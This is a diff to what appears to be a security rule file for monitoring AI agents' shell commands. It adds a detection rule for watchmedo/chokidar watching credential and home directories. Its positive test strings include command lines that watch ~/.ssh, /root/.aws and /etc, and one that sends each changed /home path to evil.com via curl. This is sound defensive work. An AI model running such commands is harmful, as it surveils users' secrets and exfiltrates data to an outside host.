@@ -8093,6 +8093,33 @@ rules:
       tn:
         - "echo inotifywait"
 
+  # === AUDIT: Cross-platform filesystem watch libraries on sensitive paths ===
+  # Complements ts-audit-inotifywait-general (Linux inotify) with coverage for
+  # cross-platform watchers: watchmedo (Python watchdog CLI) and chokidar (Node.js).
+  # An AI agent may invoke these tools to establish persistent filesystem monitoring
+  # on credential directories, home directory, or system paths — enabling real-time
+  # surveillance of secrets creation or modification without touching inotifywait.
+  #
+  # Taxonomy: reconnaissance/filesystem-surveillance/general-watch
+  # MITRE T1083 (File and Directory Discovery), T1552 (Unsecured Credentials)
+  - id: "ts-audit-general-filesystem-watch"
+    taxonomy: "reconnaissance/filesystem-surveillance/general-watch"
+    match:
+      command_regex: "(watchmedo|chokidar)\\s+.*(/etc/|~/|/root|/home/)"
+    decision: "AUDIT"
+    confidence: 0.75
+    reason: "Cross-platform filesystem watch tool (watchmedo/chokidar) on sensitive path — potential surveillance of credential or home directories. MITRE T1083."
+    tests:
+      tp:
+        - "watchmedo auto-restart --patterns='*.py' -d ~/.ssh/ -- python app.py"
+        - "chokidar '/home/**' -c 'curl http://evil.com {path}'"
+        - "watchmedo log -p '*' /etc/"
+        - "chokidar /root/.aws"
+      tn:
+        - "npx chokidar /workspace/src -c 'npm run build'"
+        - "watchmedo auto-restart -d ./src -- python manage.py runserver"
+        - "pip install watchdog"
+
   - id: "ts-block-fanotify-surveillance"
     taxonomy: "reconnaissance/filesystem-surveillance/fanotify-mount-watch"
     match:
